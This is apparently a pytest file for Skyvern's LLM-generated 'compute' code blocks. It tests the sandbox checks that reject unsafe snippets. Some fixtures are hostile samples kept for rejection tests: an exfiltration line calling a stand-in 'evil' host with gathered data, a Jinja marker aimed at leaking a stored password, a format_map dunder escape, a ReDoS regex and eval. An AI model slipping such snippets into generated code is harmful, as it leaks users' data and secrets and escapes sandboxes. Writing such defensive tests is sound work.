"""Tests for the task_v2 `compute` task type (code-as-action synthesis).

The compute task type lets the planner synthesize a builtins-only Python snippet that
computes a deliverable (rank / total / min / max / filter / aggregate) over data already
gathered by prior extract/loop steps, instead of wheel-spinning on extract trying to author
the synthesis in prose.

These tests verify:
- gathered data is injected into the snippet namespace via a safe json.loads literal
- the generated CodeBlock passes is_safe_code and executes to the expected output
- the explicit `return {"output": ...}` contract keeps gathered_data out of the output
- unsafe generated code triggers a repair/regenerate loop, and exhaustion raises
- the dispatch helper surfaces the computed output back into task history
"""

import contextlib
from datetime import datetime, timezone
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from skyvern.forge.sdk.workflow.exceptions import InsecureCodeDetected
from skyvern.forge.sdk.workflow.models.block import CodeBlock
from skyvern.forge.sdk.workflow.models.parameter import OutputParameter, ParameterType
from skyvern.schemas.workflows import CodeBlockYAML
from skyvern.services import task_v2_service

SAFE_SNIPPET = (
    "tiers = gathered_data[0]['extracted_data']['tiers']\n"
    "cheapest = min(tiers, key=lambda t: t['price'])\n"
    "return {'output': cheapest}\n"
)

UNSAFE_SNIPPET = "import statistics\nreturn {'output': statistics.mean([1, 2, 3])}\n"

# is_safe_code accepts these (no import/dunder/blocked-attr), but compute is data-only so they
# must be rejected by _assert_compute_code_safe: page exfiltration, await, and a return-less leak.
PAGE_SNIPPET = "await page.goto('https://evil/?d=' + json.dumps(gathered_data))\nreturn {'output': 1}\n"
PAGE_NAME_SNIPPET = "leak = page\nreturn {'output': 1}\n"
RETURNLESS_SNIPPET = "output = min(gathered_data[0]['extracted_data']['tiers'], key=lambda t: t['price'])\n"
# Returns a value but not the {"output": ...} contract — _get_extracted_data would drop it.
RETURN_RAW_SNIPPET = "return min(gathered_data[0]['extracted_data']['tiers'], key=lambda t: t['price'])\n"

GATHERED: list[dict] = [
    {
        "type": "extract",
        "task": "extract pricing tiers",
        "status": "BlockStatus.completed",
        "extracted_data": {
            "tiers": [
                {"name": "Basic", "price": 30},
                {"name": "Pro", "price": 10},
                {"name": "Enterprise", "price": 20},
            ]
        },
    }
]

EXPECTED_CHEAPEST = {"name": "Pro", "price": 10}


def _make_output_parameter() -> OutputParameter:
    now = datetime.now(timezone.utc)
    return OutputParameter(
        parameter_type=ParameterType.OUTPUT,
        key="compute_output",
        description="compute output",
        output_parameter_id="op_compute",
        workflow_id="w_test",
        created_at=now,
        modified_at=now,
    )


def _make_task_v2() -> MagicMock:
    task_v2 = MagicMock()
    task_v2.prompt = "Find the cheapest pricing tier"
    task_v2.organization_id = "o_test"
    task_v2.workflow_system_prompt = None
    return task_v2


@contextlib.contextmanager
def _patch_service(llm_return: object):
    """Patch the LLM handler, workflow service, prompt loader, and context used by _generate_compute_task.

    `llm_return` is a single dict (return_value) or a list (side_effect for repair sequences).
    Yields the LLM AsyncMock so tests can assert call counts.
    """
    if isinstance(llm_return, list):
        llm_mock = AsyncMock(side_effect=llm_return)
    else:
        llm_mock = AsyncMock(return_value=llm_return)
    ws_mock = MagicMock()
    ws_mock.create_output_parameter_for_block = AsyncMock(return_value=_make_output_parameter())
    ctx = MagicMock(tz_info=timezone.utc)
    # app is a proxy whose attrs live on the forge stub instance; patch.object's delattr-based
    # teardown breaks on it, so save/restore via setattr (the repo's monkeypatch.setattr pattern).
    app_obj = task_v2_service.app
    saved = {name: getattr(app_obj, name) for name in ("LLM_API_HANDLER", "WORKFLOW_SERVICE")}
    app_obj.LLM_API_HANDLER = llm_mock
    app_obj.WORKFLOW_SERVICE = ws_mock
    try:
        with (
            patch.object(task_v2_service.prompt_engine, "load_prompt", MagicMock(return_value="PROMPT")),
            patch.object(task_v2_service.skyvern_context, "ensure_context", MagicMock(return_value=ctx)),
        ):
            yield llm_mock
    finally:
        for name, value in saved.items():
            setattr(app_obj, name, value)


async def _run_codeblock(code: str) -> dict:
    block = CodeBlock(label="t", code=code, parameters=[], output_parameter=_make_output_parameter())
    fn = block.generate_async_user_function(code, MagicMock(), None)
    return await fn()


class TestBuildComputeCode:
    def test_injects_gathered_data_as_safe_literal(self) -> None:
        code = task_v2_service._build_compute_code(GATHERED, SAFE_SNIPPET)
        assert code.startswith("gathered_data = json.loads(")
        # The assembled code (injection + snippet) must pass the real sandbox gate.
        CodeBlock.is_safe_code(code)

    @pytest.mark.asyncio
    async def test_assembled_code_executes_to_expected_output(self) -> None:
        code = task_v2_service._build_compute_code(GATHERED, SAFE_SNIPPET)
        result = await _run_codeblock(code)
        assert result == {"output": EXPECTED_CHEAPEST}
        # explicit-return contract: the embedded gathered_data must not leak into output
        assert "gathered_data" not in result

    def test_indented_snippet_is_normalized(self) -> None:
        indented = "    x = gathered_data[0]['extracted_data']['tiers']\n    return {'output': len(x)}\n"
        code = task_v2_service._build_compute_code(GATHERED, indented)
        CodeBlock.is_safe_code(code)


class TestGenerateComputeTask:
    @pytest.mark.asyncio
    async def test_happy_path_returns_safe_codeblock(self) -> None:
        with _patch_service({"code": SAFE_SNIPPET}):
            block, block_yaml_list, parameter_yaml_list = await task_v2_service._generate_compute_task(
                task_v2=_make_task_v2(),
                workflow_id="w_test",
                plan="pick the cheapest tier",
                task_history=GATHERED,
            )
        assert isinstance(block, CodeBlock)
        assert len(block_yaml_list) == 1
        assert isinstance(block_yaml_list[0], CodeBlockYAML)
        assert parameter_yaml_list == []
        assert block.code.startswith("gathered_data = json.loads(")
        CodeBlock.is_safe_code(block.code)

    @pytest.mark.asyncio
    async def test_generated_block_uses_the_code_first_editor_shape(self) -> None:
        with _patch_service({"code": SAFE_SNIPPET}):
            block, block_yaml_list, _ = await task_v2_service._generate_compute_task(
                task_v2=_make_task_v2(),
                workflow_id="w_test",
                plan="pick the cheapest tier",
                task_history=GATHERED,
            )
        # A non-null prompt is what makes the editor render the code-first node. It stays
        # empty: a fabricated goal would arm runtime self-heal on a data-only block.
        assert block_yaml_list[0].prompt == ""
        assert block.prompt == ""

    @pytest.mark.asyncio
    async def test_generated_block_executes_to_expected_output(self) -> None:
        with _patch_service({"code": SAFE_SNIPPET}):
            block, _, _ = await task_v2_service._generate_compute_task(
                task_v2=_make_task_v2(),
                workflow_id="w_test",
                plan="pick the cheapest tier",
                task_history=GATHERED,
            )
        result = await _run_codeblock(block.code)
        assert result == {"output": EXPECTED_CHEAPEST}

    @pytest.mark.asyncio
    async def test_unsafe_code_triggers_repair_then_succeeds(self) -> None:
        with _patch_service([{"code": UNSAFE_SNIPPET}, {"code": SAFE_SNIPPET}]) as llm_mock:
            block, _, _ = await task_v2_service._generate_compute_task(
                task_v2=_make_task_v2(),
                workflow_id="w_test",
                plan="pick the cheapest tier",
                task_history=GATHERED,
            )
        assert llm_mock.await_count == 2
        # the returned block must hold the *repaired* safe code, never the import-bearing attempt
        CodeBlock.is_safe_code(block.code)
        assert "import statistics" not in block.code

    @pytest.mark.asyncio
    async def test_repair_exhaustion_raises(self) -> None:
        with _patch_service({"code": UNSAFE_SNIPPET}) as llm_mock:
            with pytest.raises(InsecureCodeDetected):
                await task_v2_service._generate_compute_task(
                    task_v2=_make_task_v2(),
                    workflow_id="w_test",
                    plan="pick the cheapest tier",
                    task_history=GATHERED,
                )
        assert llm_mock.await_count == 3  # all attempts exhausted (max_attempts)

    @pytest.mark.asyncio
    async def test_empty_code_is_retried_not_silently_accepted(self) -> None:
        # An empty/missing code field would assemble to just the injection line (no return), which
        # passes is_safe_code but yields no "output" — must be retried, not silently accepted.
        with _patch_service([{"thoughts": "oops"}, {"code": SAFE_SNIPPET}]) as llm_mock:
            block, _, _ = await task_v2_service._generate_compute_task(
                task_v2=_make_task_v2(),
                workflow_id="w_test",
                plan="pick the cheapest tier",
                task_history=GATHERED,
            )
        assert llm_mock.await_count == 2
        result = await _run_codeblock(block.code)
        assert result == {"output": EXPECTED_CHEAPEST}

    @pytest.mark.asyncio
    async def test_all_empty_code_raises(self) -> None:
        with _patch_service({"thoughts": "no code here"}):
            with pytest.raises(InsecureCodeDetected):
                await task_v2_service._generate_compute_task(
                    task_v2=_make_task_v2(),
                    workflow_id="w_test",
                    plan="pick the cheapest tier",
                    task_history=GATHERED,
                )

    @pytest.mark.asyncio
    async def test_no_gathered_data_raises(self) -> None:
        history_without_data = [{"type": "navigate", "task": "open page", "status": "BlockStatus.completed"}]
        with _patch_service({"code": SAFE_SNIPPET}):
            with pytest.raises(task_v2_service.ComputeTaskError):
                await task_v2_service._generate_compute_task(
                    task_v2=_make_task_v2(),
                    workflow_id="w_test",
                    plan="pick the cheapest tier",
                    task_history=history_without_data,
                )


class TestComputeCodeSafety:
    def test_page_reference_rejected(self) -> None:
        code = task_v2_service._build_compute_code(GATHERED, PAGE_NAME_SNIPPET)
        CodeBlock.is_safe_code(code)  # is_safe_code alone does NOT catch page
        with pytest.raises(InsecureCodeDetected):
            task_v2_service._assert_compute_code_safe(code)

    def test_await_rejected(self) -> None:
        code = task_v2_service._build_compute_code(GATHERED, PAGE_SNIPPET)
        with pytest.raises(InsecureCodeDetected):
            task_v2_service._assert_compute_code_safe(code)

    def test_returnless_snippet_rejected(self) -> None:
        code = task_v2_service._build_compute_code(GATHERED, RETURNLESS_SNIPPET)
        CodeBlock.is_safe_code(code)  # passes is_safe_code (no import/dunder)
        with pytest.raises(InsecureCodeDetected):
            task_v2_service._assert_compute_code_safe(code)

    def test_return_without_output_key_rejected(self) -> None:
        # `return <value>` (not the {"output": ...} contract) would be dropped downstream.
        code = task_v2_service._build_compute_code(GATHERED, RETURN_RAW_SNIPPET)
        CodeBlock.is_safe_code(code)
        with pytest.raises(InsecureCodeDetected):
            task_v2_service._assert_compute_code_safe(code)

    def test_nested_only_return_rejected(self) -> None:
        # An output dict returned only from a nested helper (no outer return) leaks via captured locals.
        nested = "def helper():\n    return {'output': 1}\nanswer = helper()\n"
        code = task_v2_service._build_compute_code(GATHERED, nested)
        CodeBlock.is_safe_code(code)
        with pytest.raises(InsecureCodeDetected):
            task_v2_service._assert_compute_code_safe(code)

    def test_outer_return_with_helper_passes(self) -> None:
        # A helper is fine as long as the snippet itself returns the output dict at the outer scope.
        with_helper = (
            "def price(t):\n    return t['price']\n"
            "ranked = sorted(gathered_data[0]['extracted_data']['tiers'], key=price)\n"
            "return {'output': ranked[0]}\n"
        )
        code = task_v2_service._build_compute_code(GATHERED, with_helper)
        CodeBlock.is_safe_code(code)
        task_v2_service._assert_compute_code_safe(code)  # does not raise

    def test_valid_snippet_passes(self) -> None:
        code = task_v2_service._build_compute_code(GATHERED, SAFE_SNIPPET)
        task_v2_service._assert_compute_code_safe(code)  # does not raise

    def test_format_map_dunder_escape_rejected(self) -> None:
        # "{x.__class__}".format_map(...) reaches dunders via a string literal the AST can't see.
        snippet = "leak = '{x.__class__}'.format_map({'x': 1})\nreturn {'output': leak}\n"
        code = task_v2_service._build_compute_code(GATHERED, snippet)
        with pytest.raises(InsecureCodeDetected):
            task_v2_service._assert_compute_code_safe(code)

    def test_str_format_rejected(self) -> None:
        snippet = "s = '{0}'.format(gathered_data)\nreturn {'output': s}\n"
        code = task_v2_service._build_compute_code(GATHERED, snippet)
        with pytest.raises(InsecureCodeDetected):
            task_v2_service._assert_compute_code_safe(code)

    def test_while_loop_rejected(self) -> None:
        # Unbounded while can't be interrupted by the async timeout (synchronous busy-loop).
        snippet = "while True:\n    pass\nreturn {'output': 1}\n"
        code = task_v2_service._build_compute_code(GATHERED, snippet)
        CodeBlock.is_safe_code(code)
        with pytest.raises(InsecureCodeDetected):
            task_v2_service._assert_compute_code_safe(code)

    def test_regex_rejected(self) -> None:
        # re is in the sandbox and enables catastrophic-backtracking ReDoS over scraped data.
        snippet = "m = re.match('(a+)+$', 'a' * 40)\nreturn {'output': bool(m)}\n"
        code = task_v2_service._build_compute_code(GATHERED, snippet)
        CodeBlock.is_safe_code(code)
        with pytest.raises(InsecureCodeDetected):
            task_v2_service._assert_compute_code_safe(code)

    def test_eval_rejected(self) -> None:
        snippet = "v = eval('1+1')\nreturn {'output': v}\n"
        code = task_v2_service._build_compute_code(GATHERED, snippet)
        with pytest.raises(InsecureCodeDetected):
            task_v2_service._assert_compute_code_safe(code)

    def test_jinja_markers_in_snippet_rejected(self) -> None:
        # CODE blocks resolve real secrets when Jinja-rendered; a {{ ... }} in the snippet body
        # would exfiltrate a live secret into the output. The data literal is escaped, but the
        # snippet body is not, so opening Jinja tags must be rejected outright.
        snippet = "secret = '{{ org_real_password }}'\nreturn {'output': secret}\n"
        code = task_v2_service._build_compute_code(GATHERED, snippet)
        CodeBlock.is_safe_code(code)  # is_safe_code does not see Jinja inside a string literal
        with pytest.raises(InsecureCodeDetected):
            task_v2_service._assert_compute_code_safe(code)

    def test_jinja_statement_in_snippet_rejected(self) -> None:
        snippet = "x = '{% if 1 %}a{% endif %}'\nreturn {'output': x}\n"
        code = task_v2_service._build_compute_code(GATHERED, snippet)
        with pytest.raises(InsecureCodeDetected):
            task_v2_service._assert_compute_code_safe(code)

    def test_nested_dict_output_still_passes(self) -> None:
        # Guard against false positives: a legit nested-dict deliverable ends with }} but has no
        # opening Jinja marker, so it must NOT be rejected.
        snippet = "return {'output': {'a': 1, 'b': {'c': 2}}}\n"
        code = task_v2_service._build_compute_code(GATHERED, snippet)
        task_v2_service._assert_compute_code_safe(code)  # does not raise

    def test_guarded_return_rejected(self) -> None:
        # A guarded return is not the unconditional final statement: at runtime it falls through to
        # the wrapper's captured-locals return, leaking gathered_data.
        snippet = "tiers = gathered_data[0]['extracted_data']['tiers']\nif tiers:\n    return {'output': tiers[0]}\n"
        code = task_v2_service._build_compute_code(GATHERED, snippet)
        CodeBlock.is_safe_code(code)
        with pytest.raises(InsecureCodeDetected):
            task_v2_service._assert_compute_code_safe(code)

    @pytest.mark.asyncio
    async def test_page_snippet_triggers_repair(self) -> None:
        with _patch_service([{"code": PAGE_SNIPPET}, {"code": SAFE_SNIPPET}]) as llm_mock:
            block, _, _ = await task_v2_service._generate_compute_task(
                task_v2=_make_task_v2(),
                workflow_id="w_test",
                plan="pick the cheapest tier",
                task_history=GATHERED,
            )
        assert llm_mock.await_count == 2
        assert "page" not in block.code

    def test_jinja_in_gathered_data_is_neutralized(self) -> None:
        # Web-derived data with Jinja markers must not survive as markers in the code (CodeBlock
        # Jinja-renders code before exec); the brace/percent chars are hex-escaped in the source.
        jinja_gathered = [{"type": "extract", "task": "t", "extracted_data": {"label": "{{ price }} {% raw %} 50%"}}]
        code = task_v2_service._build_compute_code(jinja_gathered, SAFE_SNIPPET)
        injection_line = code.splitlines()[0]
        assert "{{" not in injection_line
        assert "{%" not in injection_line
        assert "%}" not in injection_line

    @pytest.mark.asyncio
    async def test_jinja_data_round_trips_through_execution(self) -> None:
        jinja_gathered = [{"type": "extract", "task": "t", "extracted_data": {"v": "{{ x }}"}}]
        snippet = "return {'output': gathered_data[0]['extracted_data']['v']}\n"
        code = task_v2_service._build_compute_code(jinja_gathered, snippet)
        result = await _run_codeblock(code)
        assert result == {"output": "{{ x }}"}


class TestGetExtractedDataComputeBranch:
    def test_compute_branch_returns_output_value(self) -> None:
        block_result = MagicMock()
        block_result.output_parameter_value = {"output": EXPECTED_CHEAPEST}
        extracted = task_v2_service._get_extracted_data_from_block_result(block_result, "compute")
        assert extracted == EXPECTED_CHEAPEST

    def test_compute_branch_returns_none_when_no_output_key(self) -> None:
        block_result = MagicMock()
        block_result.output_parameter_value = {"unexpected": 1}
        extracted = task_v2_service._get_extracted_data_from_block_result(block_result, "compute")
        assert extracted is None


class TestComputeGating:
    def _render_planner(self, compute_enabled: bool) -> str:
        from skyvern.forge.prompts import prompt_engine

        return prompt_engine.load_prompt(
            "task_v2",
            current_url="https://example.com",
            elements="",
            local_datetime=datetime.now(timezone.utc).isoformat(),
            task_history=[],
            user_goal="compare the plan tiers",
            compute_enabled=compute_enabled,
        )

    def test_compute_advertised_when_enabled(self) -> None:
        rendered = self._render_planner(True)
        assert "compute:" in rendered
        assert "extract, loop, compute" in rendered

    def test_compute_hidden_when_disabled(self) -> None:
        rendered = self._render_planner(False)
        assert "compute:" not in rendered
        assert "extract, loop, compute" not in rendered
        assert "extract, loop." in rendered  # enum closes without compute


class TestComputePromptTemplate:
    def test_template_renders_with_gathered_data(self) -> None:
        from skyvern.forge.prompts import prompt_engine

        rendered = prompt_engine.load_prompt(
            "task_v2_generate_compute_code",
            user_goal="Find the cheapest pricing tier",
            plan="pick the cheapest tier",
            gathered_data=GATHERED,
            local_datetime=datetime.now(timezone.utc).isoformat(),
        )
        assert "gathered_data" in rendered
        assert "output" in rendered
